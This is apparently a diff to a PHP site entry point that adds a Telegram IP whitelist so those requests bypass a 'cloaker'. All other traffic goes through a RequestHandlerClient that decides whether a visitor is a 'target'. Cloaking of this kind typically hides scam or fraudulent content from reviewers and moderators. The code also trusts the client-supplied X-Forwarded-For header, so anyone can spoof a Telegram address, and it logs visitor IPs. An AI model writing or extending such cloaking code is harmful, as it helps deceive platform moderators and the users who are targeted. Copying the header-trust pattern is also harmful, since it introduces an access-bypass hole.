@@ -1,4 +1,58 @@
 <?php
+
+// Telegram IP whitelist
+$telegramIpRanges = [
+    '149.154.160.0/20',
+    '91.108.4.0/22',
+    '91.108.56.0/22',
+    '91.108.8.0/22',
+    '91.108.12.0/22',
+    '91.108.16.0/22',
+    '91.108.20.0/22',
+    '95.161.64.0/20',
+];
+
+function isTelegramIp($ip, $ranges) {
+    foreach ($ranges as $range) {
+        if (cidrMatch($ip, $range)) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function cidrMatch($ip, $cidr) {
+    list($subnet, $mask) = explode('/', $cidr);
+    $ipLong = ip2long($ip);
+    $subnetLong = ip2long($subnet);
+    $maskBits = -1 << (32 - $mask);
+    $subnetLong &= $maskBits;
+    return ($ipLong & $maskBits) == $subnetLong;
+}
+
+$clientIp = $_SERVER['REMOTE_ADDR'] ?? '';
+$requestUri = $_SERVER['REQUEST_URI'] ?? '';
+
+// X-Forwarded-For for proxies (Cloudflare etc)
+if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $forwardedIps = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+    $clientIp = trim($forwardedIps[0]);
+}
+
+// Debug log
+error_log("Cloaker check - IP: $clientIp, URI: $requestUri, Is TG: " . (isTelegramIp($clientIp, $telegramIpRanges) ? 'yes' : 'no'));
+
+// Bypass cloaker for all Telegram IPs
+if (isTelegramIp($clientIp, $telegramIpRanges)) {
+    require __DIR__.'/../vendor/autoload.php';
+    $app = require_once __DIR__.'/../bootstrap/app.php';
+    $kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
+    $response = $kernel->handle($request = Illuminate\Http\Request::capture());
+    $response->send();
+    $kernel->terminate($request, $response);
+    exit;
+}
+
 $isTarget = (new RequestHandlerClient())->run();
 
 
@@ -242,7 +296,6 @@ class RequestHandlerClient
                 unset($_REQUEST['jsdata']);
             }
         }
-        $headers['HTTP_ACCEPT_ENCODING'] = 'gzip, deflate, br';
         return $data;
     }
 
